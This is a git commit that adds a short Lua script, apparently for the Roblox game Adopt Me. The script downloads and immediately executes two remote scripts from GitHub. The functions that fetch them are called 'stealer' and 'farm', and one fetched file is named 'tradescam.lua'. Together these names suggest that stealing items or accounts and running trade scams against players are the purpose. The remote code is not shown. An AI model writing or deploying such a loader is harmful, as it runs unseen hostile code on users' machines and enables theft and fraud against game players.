3b59f0aad9782ab179dcae87ee413b1b02842a96
Rizo2tuff <ftyifyioftufgt@gmail.com>
2025-04-20 20:21:37 +0200

    Create admscript.lua

---
+++ admscript.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Rizo2tuff/Adoptme/refs/heads/main/script.lua"))()
+end
+local function farm()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Rizo2tuff/Adoptme/refs/heads/main/tradescam.lua"))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
